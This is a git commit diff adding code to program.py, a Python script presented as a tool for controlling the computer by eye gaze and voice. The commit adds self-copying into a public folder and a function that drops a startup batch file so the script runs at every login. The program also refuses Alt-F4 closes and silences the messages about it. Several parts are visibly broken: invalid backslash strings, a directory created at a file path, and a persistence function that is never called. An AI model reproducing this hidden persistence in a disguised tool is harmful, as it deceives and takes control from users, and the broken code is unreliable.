d71f75038a8a3703e5dce532f8e6e8bd2922d993
Java Software <pj.midgard@yahoo.com>
2020-07-17 10:44:54 +0100

    Jurijus Pacalovas. I have written programs.
    Jurijus Pacalovas. I have written programs.
    This program can control computer by eyes and voice.

--- program.py
+++ program.py
@@ -1,4 +1,15 @@
+import os
+import getpass
+import shutil
+import zmq
+from pymouse import PyMouse
 from tkinter import *
+
+_author__ = 'Jurijus Pacalovas. I have written programs.'
+describe='This program can control computer by eyes and voice.'
+print(_author__)
+
+######################################################
 
 root = Tk()
 
@@ -6,16 +17,16 @@ pressed_f4 = False  # Is Alt-F4 pressed?
 
 def do_exit():
     global pressed_f4
-    print('Trying to close application')
+    #print('Trying to close application')
     if pressed_f4:  # Deny if Alt-F4 is pressed
-        print('Denied!')
+        #print('Denied!')
         pressed_f4 = False  # Reset variable
     else:
         close()     # Exit application
 
 def alt_f4(event):  # Alt-F4 is pressed
     global pressed_f4
-    print('Alt-F4 pressed')
+    #print('Alt-F4 pressed')
     pressed_f4 = True
 
 def close(*event):  # Exit application
@@ -27,8 +38,28 @@ root.protocol("WM_DELETE_WINDOW",do_exit)
 
 root.mainloop()
 
-import zmq
-from pymouse import PyMouse
+#########################################################
+
+
+
+newpath = r'C:\Users\Public\Documents\Program\program.py' 
+if not os.path.exists(newpath):
+    os.makedirs(newpath)
+shutil.copyfile('program.py', 'C:\Users\Public\Documents\Program\program.py')
+###########################################################
+
+USER_NAME = getpass.getuser()
+
+
+def add_to_startup(file_path="C:\\Users\\Public\\Program\\program.py"):
+    if file_path == "C:\\Users\\Public\\Documents\\Program\\program.py":
+        #print("ok")
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
+###########################################################
+
 
 #mouse setup
 m = PyMouse()
@@ -75,3 +106,4 @@ while True:
     else:
         # process non gaze position events from plugins here
         pass
+##############################################################
